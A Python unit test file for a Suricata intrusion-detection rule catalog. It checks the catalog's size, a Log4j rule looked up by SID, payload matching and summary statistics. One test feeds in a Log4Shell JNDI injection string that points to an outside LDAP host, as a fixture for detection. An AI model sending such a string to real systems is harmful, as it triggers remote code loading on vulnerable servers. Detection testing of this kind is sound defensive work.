import unittest
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from aegisguard.catalogs.suricata_rules import (
    SuricataRulesEngine,
    SURICATA_CATALOG,
    RuleAction
)


class TestSuricataSignatures(unittest.TestCase):
    def test_catalog_populated(self):
        self.assertGreaterEqual(len(SURICATA_CATALOG), 300)

    def test_get_rule_by_sid(self):
        rule = SuricataRulesEngine.get_rule(2034647)
        self.assertIsNotNone(rule)
        self.assertEqual(rule.protocol, "http")
        self.assertIn("Log4j", rule.msg)

    def test_payload_inspection_match(self):
        payload = "GET /test?search=${jndi:ldap://198.51.100.42:1389/Exploit} HTTP/1.1"
        matches = SuricataRulesEngine.inspect_payload(payload)
        self.assertGreaterEqual(len(matches), 1)

    def test_catalog_summary(self):
        summary = SuricataRulesEngine.get_catalog_summary()
        self.assertGreater(summary["total_rules"], 300)
        self.assertIn("http", summary["protocols"])


if __name__ == "__main__":
    unittest.main()
